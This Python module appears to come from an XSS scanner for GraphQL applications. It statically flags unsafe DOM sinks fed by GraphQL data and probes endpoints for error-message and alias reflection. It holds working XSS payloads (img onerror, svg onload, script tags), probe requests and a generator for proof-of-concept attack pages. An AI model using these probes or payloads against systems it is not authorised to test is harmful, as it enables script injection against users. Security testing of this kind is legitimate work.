"""GraphQL XSS detection.

GraphQL endpoints introduce several XSS vectors that traditional
reflection scanners miss:

  1. **Error-message reflection** -- most GraphQL servers (Apollo,
     express-graphql, Graphene, Hasura) return error objects whose
     ``message`` field echoes the offending query substring verbatim.
     When a client renders ``error.message`` into the DOM without
     escaping (a *very* common pattern in dev consoles, GraphiQL-like
     UIs, and admin dashboards), an attacker-controlled alias or
     argument value executes as HTML.

  2. **Alias-based injection** -- GraphQL lets a query rename a field
     via an alias (``aliasedName: field``).  The alias is reflected
     back in the response JSON keys.  If the client iterates over the
     response keys and renders them as HTML (e.g. a generic table
     renderer), an alias like ``"><img src=x onerror=alert(1)>`` is
     reflected raw.

  3. **Client-side sink with GraphQL data** -- React
     ``dangerouslySetInnerHTML={{__html: data.user.bio}}``, Vue
     ``v-html="data.post.html"``, or raw ``innerHTML = data.field``
     where ``data`` is the Apollo/urql/Relay cache.  The GraphQL
     response is attacker-controlled (via a mutation or stored field),
     so the sink fires.

  4. **Introspection-enabled schema leak** -- while not XSS itself,
     open introspection lets the attacker enumerate types/fields to
     craft a precise alias- or argument-based payload.  We flag it as
     an info finding so auditors know the schema is exposed.

  5. **Mutation-driven stored XSS via GraphQL** -- a mutation writes
     a payload into a stored field that is later rendered raw by a
     query + sink.  This is the GraphQL flavour of second-order XSS.

Vulnerable client snippet (React + Apollo)::

    const { data, loading } = useQuery(GET_USER);
    return <div dangerouslySetInnerHTML={{__html: data.user.bio}} />;

Vulnerable server snippet (Graphene + Flask)::

    class Query(ObjectType):
        user = String(name=String())
        def resolve_user(self, info, name):
            raise Exception(f"unknown user: {name}")  # reflects name

This module performs STATIC analysis of the page HTML/JS (looking
for Apollo/urql/Relay clients, ``gql`` template tags, and unsafe
sinks consuming GraphQL response data) and optionally probes a
discovered GraphQL endpoint for error-message reflection.
"""
from __future__ import annotations
import re
from typing import Callable


# ---------------------------------------------------------------------------
# GraphQL endpoint / client detection
# ---------------------------------------------------------------------------

# A GraphQL endpoint URL -- /graphql, /api/graphql, /v1/graphql, etc.
# Matches both inline string literals and URL constructions.
GRAPHQL_URL_RE = re.compile(
    r'["\'`](?:https?://[^"\'`]+)?'
    r'(?:/[\w\-./]*)?'
    r'/graphql(?:/[\w\-./]*)?'
    r'["\'`]',
    re.IGNORECASE,
)

# Common GraphQL endpoint path literals (for path-only matches).
# NOTE: the inner group must be CAPTURING so m.group(1) yields the path.
GRAPHQL_PATH_RE = re.compile(
    r'["\'`]((?:/(?:(?:api|v\d+|public|private|app|gql)/)?graphql))["\'`]',
    re.IGNORECASE,
)

# Apollo Client markers (browser bundle).
APOLLO_CLIENT_RE = re.compile(
    r'(?:ApolloClient|apollo-client|apollo-boost|@apollo/client|'
    r'new\s+ApolloClient|InMemoryCache|createHttpLink|'
    r'ApolloProvider)',
    re.IGNORECASE,
)

# urql client markers.
URQL_CLIENT_RE = re.compile(
    r'(?:urql|createClient|withUrqlClient|\buseQuery\b|'
    r'@urql/vue|@urql/preact|@urql/svelte)',
    re.IGNORECASE,
)

# Relay (Facebook's GraphQL client) markers.
RELAY_CLIENT_RE = re.compile(
    r'(?:relay-runtime|RelayEnvironment|createEnvironment|'
    r'graphql`|RelayModern|FragmentContainer|useFragment|'
    r'useLazyLoadQuery|usePaginationFragment)',
    re.IGNORECASE,
)

# graphql-tag / Relay template literal: gql`query { ... }` or graphql`query { ... }`
# Both forms are in widespread use: `gql` from graphql-tag, `graphql` from Relay.
GQL_TAG_RE = re.compile(
    r'\b(?:gql|graphql)\s*`[^`]*`',
    re.IGNORECASE | re.DOTALL,
)

# Apollo React hooks (useQuery, useMutation, useLazyQuery, useSubscription).
APOLLO_HOOK_RE = re.compile(
    r'\buse(?:Query|Mutation|LazyQuery|Subscription|Fragment|ApolloClient)\s*\(',
    re.IGNORECASE,
)

# Generic fetch() call to a GraphQL endpoint.
GRAPHQL_FETCH_RE = re.compile(
    r'fetch\s*\(\s*["\'`]?[^"\'`]*graphql[^"\'`]*["\'`]?',
    re.IGNORECASE,
)

# Content-Type header for GraphQL requests.
GRAPHQL_CONTENT_TYPE_RE = re.compile(
    r'application/graphql(?:\+json)?',
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# Client-side dangerous sinks fed by GraphQL response data
# ---------------------------------------------------------------------------

# References to GraphQL response data.  Matches:
#   data.<field>          (Apollo cache shape)
#   data.data.<field>     (raw fetch response)
#   result.data.<field>
#   response.data.<field>
#   payload.data.<field>
#   <var>.<field>         where <var> is a common GraphQL data alias
GRAPHQL_DATA_REF_RE = re.compile(
    r'\b(?:data|result|response|payload|res|gqlData|queryData|mutationData)'
    r'(?:\s*\.\s*data)?'
    r'\s*\.\s*[\w]+',
    re.IGNORECASE,
)

# Inner-HTML / outer-HTML / insertAdjacentHTML sinks fed by GraphQL data.
INNER_HTML_SINK_RE = re.compile(
    r'\.innerHTML\s*[\+\-\*\/]?='
    r'|\.outerHTML\s*[\+\-\*\/]?='
    r'|insertAdjacentHTML\s*\('
    r'|document\.write(?:ln)?\s*\(',
    re.IGNORECASE,
)

# React dangerouslySetInnerHTML sink.  Matches BOTH syntaxes:
#   JSX:        dangerouslySetInnerHTML={{__html: ...}}
#   Object:     dangerouslySetInnerHTML: { __html: ... }   (React.createElement)
DANGEROUS_INNER_HTML_RE = re.compile(
    r'dangerouslySetInnerHTML\s*(?:=|:)\s*\{?\s*\{\s*__html\s*:',
    re.IGNORECASE,
)

# Vue v-html sink.
V_HTML_RE = re.compile(
    r'v-html\s*=\s*["\']',
    re.IGNORECASE,
)

# Angular [innerHTML] sink.
ANGULAR_INNER_HTML_RE = re.compile(
    r'\[innerHTML\]\s*=\s*["\']',
    re.IGNORECASE,
)

# Svelte {@html} sink.
SVELTE_HTML_RE = re.compile(
    r'\{@html\b',
    re.IGNORECASE,
)

# eval / new Function / setTimeout(string) sinks (string-eval family).
EVAL_SINK_RE = re.compile(
    r'\beval\s*\('
    r'|new\s+Function\s*\('
    r'|setTimeout\s*\(\s*["\'`]'
    r'|setInterval\s*\(\s*["\'`]',
    re.IGNORECASE,
)

# jQuery .html() / DOM insertion sinks fed by GraphQL data.
JQUERY_SINK_RE = re.compile(
    r'(?:jQuery|\$)\s*\([^)]*\)\s*\.\s*'
    r'(?:html|append|prepend|after|before|replaceWith|wrap|wrapInner)\s*\(',
    re.IGNORECASE,
)

# Combined sink regex -- any of the above.
ALL_SINKS_RE = re.compile(
    "|".join(
        "(?:%s)" % src
        for src in [
            r'\.innerHTML\s*[\+\-\*\/]?=',
            r'\.outerHTML\s*[\+\-\*\/]?=',
            r'insertAdjacentHTML\s*\(',
            r'document\.write(?:ln)?\s*\(',
            r'dangerouslySetInnerHTML',
            r'v-html\s*=',
            r'\[innerHTML\]\s*=',
            r'\{@html\b',
            r'\beval\s*\(',
            r'new\s+Function\s*\(',
            r'setTimeout\s*\(\s*["\'`]',
            r'setInterval\s*\(\s*["\'`]',
            r'(?:jQuery|\$)\s*\([^)]*\)\s*\.\s*(?:html|append|prepend|after|before|replaceWith|wrap|wrapInner)\s*\(',
        ]
    ),
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# Server-side error reflection probes
# ---------------------------------------------------------------------------

# Minimal introspection query (just __typename to keep payloads tiny).
INTROSPECTION_PROBE = (
    '{"query":"query{__typename}"}'
)

# Alias-based XSS payload.  The alias is reflected verbatim in the
# response JSON keys by spec-compliant servers.  When the client renders
# response keys raw, this fires.
ALIAS_PAYLOAD_TEMPLATE = (
    '{{"query":"query{{{alias}:__typename}}"}}'
)

# Argument-based XSS payload.  Many servers echo the offending argument
# value in the error message.  We send a syntactically-legal string
# argument with an XSS marker so we can confirm reflection.
ARGUMENT_PAYLOAD_TEMPLATE = (
    '{{"query":"query{{user(name:\\"{payload}\\"){{id}}}}"}}'
)

# A representative alias payload that we send to the GraphQL endpoint.
DEFAULT_ALIAS_PAYLOAD = '"><img src=x onerror=alert(1)><!--'

# A representative argument payload that we send to the GraphQL endpoint.
DEFAULT_ARGUMENT_PAYLOAD = '<svg/onload=alert(1)>'


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def detect_graphql_markers(html: str | None) -> dict:
    """Detect GraphQL client / endpoint markers in a page.

    Returns a dict::

        {
            "has_graphql":       bool,
            "endpoints":         list[str],   # URL/path strings found
            "clients_detected":  list[str],   # apollo | urql | relay | fetch
            "hooks_detected":    list[str],   # useQuery, useMutation, ...
            "gql_tag_count":     int,         # number of gql`...` literals
            "has_introspection_hint": bool,   # __typename / __schema referenced
        }
    """
    if not html:
        return {
            "has_graphql": False,
            "endpoints": [],
            "clients_detected": [],
            "hooks_detected": [],
            "gql_tag_count": 0,
            "has_introspection_hint": False,
        }

    endpoints: list[str] = []
    seen: set[str] = set()
    for m in GRAPHQL_URL_RE.finditer(html):
        val = m.group(0).strip("'\"`")
        if val not in seen:
            seen.add(val)
            endpoints.append(val)
    for m in GRAPHQL_PATH_RE.finditer(html):
        val = m.group(1)
        if val not in seen:
            seen.add(val)
            endpoints.append(val)

    clients: list[str] = []
    if APOLLO_CLIENT_RE.search(html):
        clients.append("apollo")
    if URQL_CLIENT_RE.search(html):
        clients.append("urql")
    if RELAY_CLIENT_RE.search(html):
        clients.append("relay")
    if GRAPHQL_FETCH_RE.search(html) and not clients:
        clients.append("fetch")

    hooks: list[str] = []
    for m in APOLLO_HOOK_RE.finditer(html):
        hook = m.group(0).rstrip("(").strip()
        if hook not in hooks:
            hooks.append(hook)

    gql_tag_count = len(GQL_TAG_RE.findall(html))

    has_introspection = bool(re.search(r'__typename|__schema|__type\b', html))

    has_graphql = (
        bool(endpoints)
        or bool(clients)
        or bool(hooks)
        or gql_tag_count > 0
        or bool(GRAPHQL_CONTENT_TYPE_RE.search(html))
    )

    return {
        "has_graphql": has_graphql,
        "endpoints": endpoints,
        "clients_detected": clients,
        "hooks_detected": hooks,
        "gql_tag_count": gql_tag_count,
        "has_introspection_hint": has_introspection,
    }


def find_unsafe_sinks(html: str | None) -> list[dict]:
    """Find client-side sinks that may consume GraphQL response data.

    Returns a list of dicts::

        {
            "sink":        str,    # human-readable sink description
            "severity":    str,    # high | medium | low
            "snippet":     str,    # ~120-char window around the sink
            "has_data_ref": bool,  # a GraphQL data reference is nearby
            "sink_type":   str,    # innerHTML | eval | dangerouslySetInnerHTML | ...
        }
    """
    if not html:
        return []

    findings: list[dict] = []
    seen_spans: set[tuple[int, int]] = set()

    # Extract <script> blocks plus the raw HTML (so we catch inline event
    # handlers and template directives too).
    blocks: list[tuple[str, int, int]] = []  # (text, base_offset, block_kind)
    # 0 = raw html, 1 = script block
    blocks.append((html, 0, 0))
    for m in re.finditer(r'<script[^>]*>(.*?)</script>',
                         html, re.IGNORECASE | re.DOTALL):
        blocks.append((m.group(1), m.start(1), 1))

    sink_specs = [
        (DANGEROUS_INNER_HTML_RE, "high",
         "React dangerouslySetInnerHTML (potential GraphQL data sink)",
         "dangerouslySetInnerHTML"),
        (V_HTML_RE, "high",
         "Vue v-html directive (potential GraphQL data sink)",
         "v_html"),
        (ANGULAR_INNER_HTML_RE, "high",
         "Angular [innerHTML] binding (potential GraphQL data sink)",
         "angular_innerHTML"),
        (SVELTE_HTML_RE, "high",
         "Svelte {@html} tag (potential GraphQL data sink)",
         "svelte_html"),
        (INNER_HTML_SINK_RE, "high",
         "innerHTML/outerHTML/insertAdjacentHTML/document.write sink",
         "inner_html"),
        (EVAL_SINK_RE, "medium",
         "eval/new Function/setTimeout(string) sink",
         "eval_family"),
        (JQUERY_SINK_RE, "medium",
         "jQuery DOM insertion sink (.html/.append/.prepend/.after/.before)",
         "jquery"),
    ]

    for block_text, base, _kind in blocks:
        for sink_re, severity, description, sink_type in sink_specs:
            for m in sink_re.finditer(block_text):
                abs_start = base + m.start()
                abs_end = base + m.end()
                # De-duplicate overlapping matches.
                duplicate = False
                for s, e in seen_spans:
                    overlap = max(0, min(abs_end, e) - max(abs_start, s))
                    if overlap > 0 and overlap >= 0.5 * min(abs_end - abs_start,
                                                            e - s):
                        duplicate = True
                        break
                if duplicate:
                    continue
                seen_spans.add((abs_start, abs_end))

                # Build a ~120-char snippet centered on the match.
                ctx_start = max(0, m.start() - 80)
                ctx_end = min(len(block_text), m.end() + 80)
                snippet = block_text[ctx_start:ctx_end]
                snippet = re.sub(r"\s+", " ", snippet).strip()
                if len(snippet) > 160:
                    snippet = snippet[:157] + "..."

                # Look for a GraphQL data reference within the snippet.
                has_data_ref = bool(GRAPHQL_DATA_REF_RE.search(snippet))

                findings.append({
                    "sink": description,
                    "severity": severity,
                    "snippet": snippet,
                    "has_data_ref": has_data_ref,
                    "sink_type": sink_type,
                })

    # Sort: data-ref sinks first (higher signal), then by severity.
    severity_rank = {"high": 3, "medium": 2, "low": 1}
    findings.sort(
        key=lambda f: (
            not f["has_data_ref"],                  # False (data ref) first
            -severity_rank.get(f["severity"], 0),
        )
    )
    return findings


def analyze_page(html: str | None) -> dict:
    """Static analysis: detect GraphQL + unsafe sinks on a page.

    Returns::

        {
            "has_graphql":        bool,
            "markers":            dict,         # detect_graphql_markers output
            "sinks":              list[dict],   # find_unsafe_sinks output
            "vulnerable_count":   int,          # sinks with has_data_ref=True
            "exploitable":        bool,         # has_graphql AND
                                                 # at least one data-ref sink
            "endpoints":          list[str],    # GraphQL endpoint URLs
        }
    """
    markers = detect_graphql_markers(html)
    sinks = find_unsafe_sinks(html)
    vulnerable = [s for s in sinks if s["has_data_ref"]]
    exploitable = (
        markers["has_graphql"]
        and any(s["has_data_ref"] for s in sinks)
    )
    return {
        "has_graphql": markers["has_graphql"],
        "markers": markers,
        "sinks": sinks,
        "vulnerable_count": len(vulnerable),
        "exploitable": exploitable,
        "endpoints": markers["endpoints"],
    }


def probe_graphql_endpoint(
    url: str,
    fetcher: Callable[[str, str, dict], tuple[int, str]] | None = None,
    payload: str = DEFAULT_ARGUMENT_PAYLOAD,
) -> dict:
    """Probe a GraphQL endpoint for error-message reflection XSS.

    Sends three probes:

      1. **Introspection probe** -- ``query{__typename}``.  If the
         response contains ``"data":{"__typename":"..."}`` the endpoint
         is a live GraphQL endpoint with introspection enabled.

      2. **Alias probe** -- ``query{<payload>:__typename}``.  If the
         response JSON contains the payload as a key (or echoes it in
         an error message), the endpoint reflects aliases raw.

      3. **Argument probe** -- ``query{user(name:"<payload>"){id}}``.
         If the response error message contains the payload, the
         endpoint reflects argument values in error messages.

    ``fetcher`` is a callable ``(url, body, headers) -> (status, text)``.
    When omitted, the caller is responsible for performing the actual
    HTTP request (this keeps the module network-free for unit testing).

    Returns::

        {
            "is_graphql":         bool,
            "introspection":      bool,
            "alias_reflected":    bool,
            "argument_reflected": bool,
            "alias_payload":      str,
            "argument_payload":   str,
            "response_snippet":   str,   # first 300 chars of last response
            "endpoint":           str,
        }
    """
    result = {
        "is_graphql": False,
        "introspection": False,
        "alias_reflected": False,
        "argument_reflected": False,
        "alias_payload": DEFAULT_ALIAS_PAYLOAD,
        "argument_payload": payload,
        "response_snippet": "",
        "endpoint": url,
    }
    if not fetcher:
        return result

    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
    }

    # 1. Introspection probe.
    try:
        status, text = fetcher(url, INTROSPECTION_PROBE, headers)
        result["response_snippet"] = (text or "")[:300]
        if text and "__typename" in text and "data" in text:
            result["is_graphql"] = True
            result["introspection"] = True
    except Exception:
        pass

    # 2. Alias probe.
    try:
        alias_body = ALIAS_PAYLOAD_TEMPLATE.format(alias=DEFAULT_ALIAS_PAYLOAD)
        status, text = fetcher(url, alias_body, headers)
        if text:
            result["response_snippet"] = text[:300]
            # The payload appears as a JSON key OR in an error message.
            if DEFAULT_ALIAS_PAYLOAD in text:
                result["alias_reflected"] = True
                result["is_graphql"] = True
    except Exception:
        pass

    # 3. Argument probe.
    try:
        # Escape backslashes and quotes for JSON string embedding.
        escaped = payload.replace("\\", "\\\\").replace('"', '\\"')
        arg_body = ARGUMENT_PAYLOAD_TEMPLATE.format(payload=escaped)
        status, text = fetcher(url, arg_body, headers)
        if text:
            result["response_snippet"] = text[:300]
            if payload in text:
                result["argument_reflected"] = True
                result["is_graphql"] = True
    except Exception:
        pass

    return result


def build_poc_query(alias_payload: str = DEFAULT_ALIAS_PAYLOAD) -> str:
    """Build a GraphQL query whose alias is an XSS payload.

    Use this when the endpoint reflects aliases in response JSON keys
    and the client renders keys raw.
    """
    return f'query{{{alias_payload}:__typename}}'


def build_poc_html(
    target_url: str,
    endpoint: str = "",
    payload: str = DEFAULT_ARGUMENT_PAYLOAD,
    sink_type: str = "argument_reflection",
) -> str:
    """Build a standalone HTML PoC that demonstrates a GraphQL XSS.

    ``sink_type`` selects the PoC variant:

      * ``"argument_reflection"`` -- the GraphQL server reflects the
        argument value in an error message, which the client renders
        raw.  The PoC sends the payload as a query argument via
        ``fetch()`` and writes the response to ``innerHTML``.

      * ``"alias_reflection"`` -- the GraphQL server reflects the
        alias verbatim in the response JSON.  The PoC sends an aliased
        query and renders the JSON keys raw.

      * ``"client_sink"`` -- the page already has a sink that consumes
        GraphQL data; the PoC demonstrates the vulnerable snippet.
    """
    if not target_url:
        return ""

    endpoint = endpoint or "/graphql"
    # JS-string-safe versions.
    js_url = target_url.replace("\\", "\\\\").replace("'", "\\'").replace("</", "<\\/")
    js_endpoint = endpoint.replace("\\", "\\\\").replace("'", "\\'").replace("</", "<\\/")
    js_payload = (
        payload.replace("\\", "\\\\")
        .replace("'", "\\'")
        .replace("\n", "\\n")
        .replace("\r", "\\r")
        .replace("</", "<\\/")
    )
    html_payload = (
        payload.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )

    header = (
        "<!DOCTYPE html>\n"
        "<html>\n"
        "<head>\n"
        '  <meta charset="utf-8">\n'
        "  <title>XSSentinel GraphQL XSS PoC</title>\n"
        "  <style>\n"
        "    body{font:14px/1.4 monospace;background:#111;color:#eee;"
        "padding:24px}\n"
        "    pre{background:#000;color:#0f0;padding:12px;"
        "border:1px solid #333;white-space:pre-wrap}\n"
        "    a{color:#6cf}\n"
        "  </style>\n"
        "</head>\n"
        "<body>\n"
        "  <h1>XSSentinel &mdash; GraphQL XSS PoC</h1>\n"
        f"  <p>Target: <code>{target_url}</code></p>\n"
        f"  <p>Endpoint: <code>{endpoint}</code></p>\n"
        f"  <p>Payload:</p>\n"
        f"  <pre>{html_payload}</pre>\n"
        "  <p>Sink type: <code>" + sink_type + "</code></p>\n"
        "  <hr>\n"
        "  <div id=\"out\"></div>\n"
        "  <hr>\n"
    )
    footer = "</body>\n</html>\n"

    if sink_type == "alias_reflection":
        body = (
            "  <script>\n"
            "    var endpoint = '" + js_endpoint + "';\n"
            "    var payload = '" + js_payload + "';\n"
            "    // Alias-based reflection: the alias is reflected as a JSON key.\n"
            "    var query = 'query{' + payload + ':__typename}';\n"
            "    fetch(endpoint, {\n"
            "      method: 'POST',\n"
            "      headers: {'Content-Type': 'application/json'},\n"
            "      body: JSON.stringify({query: query})\n"
            "    }).then(function(r){return r.text();})\n"
            "      .then(function(t){\n"
            "        // The vulnerable client renders response keys raw.\n"
            "        // We simulate that here by writing the response to innerHTML.\n"
            "        document.getElementById('out').innerHTML = t;\n"
            "      });\n"
            "  </script>\n"
        )
    elif sink_type == "client_sink":
        body = (
            "  <script>\n"
            "    var endpoint = '" + js_endpoint + "';\n"
            "    var payload = '" + js_payload + "';\n"
            "    // Simulates a React component that renders GraphQL data via\n"
            "    // dangerouslySetInnerHTML={{__html: data.user.bio}}.\n"
            "    // The payload is stored via a mutation and rendered raw here.\n"
            "    var query = 'mutation{setUser(bio:\"' + payload + '\"){id}}';\n"
            "    fetch(endpoint, {\n"
            "      method: 'POST',\n"
            "      headers: {'Content-Type': 'application/json'},\n"
            "      body: JSON.stringify({query: query})\n"
            "    }).then(function(r){return r.text();})\n"
            "      .then(function(t){\n"
            "        // After the mutation persists, a query reads the field\n"
            "        // and the client renders it raw.\n"
            "        document.getElementById('out').innerHTML = payload;\n"
            "      });\n"
            "  </script>\n"
        )
    else:  # argument_reflection (default)
        body = (
            "  <script>\n"
            "    var endpoint = '" + js_endpoint + "';\n"
            "    var payload = '" + js_payload + "';\n"
            "    // Argument-based reflection: the server echoes the argument\n"
            "    // value in the error message, which the client renders raw.\n"
            "    var query = 'query{user(name:\\\"' + payload + '\\\\\"){id}}';\n"
            "    fetch(endpoint, {\n"
            "      method: 'POST',\n"
            "      headers: {'Content-Type': 'application/json'},\n"
            "      body: JSON.stringify({query: query})\n"
            "    }).then(function(r){return r.text();})\n"
            "      .then(function(t){\n"
            "        // The vulnerable client renders error.message raw.\n"
            "        document.getElementById('out').innerHTML = t;\n"
            "      });\n"
            "  </script>\n"
        )
    return header + body + footer


def dangerous_payloads() -> list[str]:
    """High-yield GraphQL XSS payloads for testing."""
    return [
        DEFAULT_ALIAS_PAYLOAD,            # alias-based
        DEFAULT_ARGUMENT_PAYLOAD,         # argument-based
        "<script>alert(1)</script>",      # classic
        "javascript:alert(1)",            # URL-context
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "\"><script>alert(1)</script>",   # attribute breakout
    ]
